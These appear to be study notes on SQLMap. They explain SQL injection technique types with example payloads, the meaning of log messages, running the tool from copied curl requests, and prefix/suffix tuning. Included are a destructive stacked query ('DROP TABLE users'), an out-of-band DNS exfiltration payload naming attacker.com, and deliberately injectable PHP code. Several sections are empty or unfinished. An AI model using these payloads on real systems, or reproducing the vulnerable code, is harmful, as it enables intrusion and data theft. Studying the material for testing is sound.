B – Boolean-based blind

    Example: AND 1=1
    Infers data by comparing true vs false server responses.
    Retrieves 1 byte per request.
    Most common SQLi type in web apps.

E – Error-based

    Example: AND GTID_SUBSET(@@version,0)
    Uses database error messages to extract data.
    Faster than blind types; depends on error visibility.
    Supported by: MySQL, MSSQL, PostgreSQL, Oracle, etc.

U – UNION query-based

    Example: UNION ALL SELECT 1,@@version,3
    Adds attacker’s query results to the original output.
    Fastest method when output is reflected in the page.
    Ideal for dumping whole tables in a single request.

S – Stacked queries

    Example: ; DROP TABLE users
    Executes multiple SQL statements in one go.
    Useful for non-SELECT operations like INSERT or DELETE.
    Supported by MSSQL, PostgreSQL, etc.
    Enables advanced actions like OS command execution.

T – Time-based blind

    Example: AND 1=IF(2>1,SLEEP(5),0)
    Uses response delays to infer true/false conditions.
    Slower than Boolean-based.
    Works when no visible output is available.

Q – Inline queries

    Example: SELECT (SELECT @@version) FROM ...
    Embeds a subquery inside a main query.
    Rare, requires specific query structure.
    Still supported by SQLMap.

Out-of-band

    Example: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
    Data is exfiltrated through external channels (e.g., DNS).
    Used when other SQLi types are blocked or too slow.
    Requires the server to make outbound connections.
    SQLMap supports this via DNS-based exfiltration.


# SQLMap Output Description

## Log Messages Description

### Log Message:
    "target URL content is stable"
    Server response doesn't change on repeated requests, helping SQLi detection.

### Log Message:
    "GET parameter 'id' appears to be dynamic"
    Parameter affects response – a good sign for possible SQL injection.

### Log Message:
    "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
    Basic test shows potential SQLi; DBMS might be MySQL.

### Log Message:
    "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
    Detected possible XSS vulnerability during heuristic check.

### Log Message:
    "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"
    SQLMap found MySQL; suggests skipping payloads for other DBMSes.

### Log Message:
    "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"
    Offers to run extended MySQL-specific SQLi tests.

### Log Message:
    "reflective value(s) found and filtering out"
    Payload reflections detected in response; SQLMap filters them automatically.

### Log Message:
    "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=\"luther\")"
    Likely Boolean-based blind SQLi; uses string match to distinguish TRUE/FALSE.

### Log Message:
    "time-based comparison requires a larger statistical model, please wait........... (done)"
    Builds response-time model to detect time-based SQLi.

### Log Message:
    "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"
    Increases UNION SQLi testing due to signs of other SQLi types.

### Log Message:
    "'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"
    ORDER BY is usable; helps find correct column count faster for UNION-based SQLi.

### Log Message:
    "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"
    SQLi confirmed on parameter; optionally test other parameters.

### Log Message:
    "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"
    SQLi injection points found and confirmed; details follow.

### Log Message:
    "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
    Results saved to local folder for analysis and reuse.

# Running SQLMap on an HTTP Request

## Curl Commands
Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. After that, we just have to change curl for sqlmap in terminal

```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

In the most common scenario, GET parameters are provided with the usage of option -u/--url. As for testing POST data, the --data

## Full HTTP Requests

#### Tip
```
similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
```

## Custom SQLMap Requests
SQLMap also supports JSON and XML formatted

-------------
-------------
```
```

# Handling SQLMap Errors 

--parse-errors
-t - stores whole traffic to file
-v (number) - verbose
--proxy - use proxy

# Attack Tuning

Every payload sent to the target consists of:
* vector (UNION ALL SELECT 1,2,version()) - central part of payload
* boundaries (<vector>-- ) - prefix and suffix formations, used to proper injection

## Prefix / Suffix
```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.

```
Code: php

$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);

```

```
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level/Risk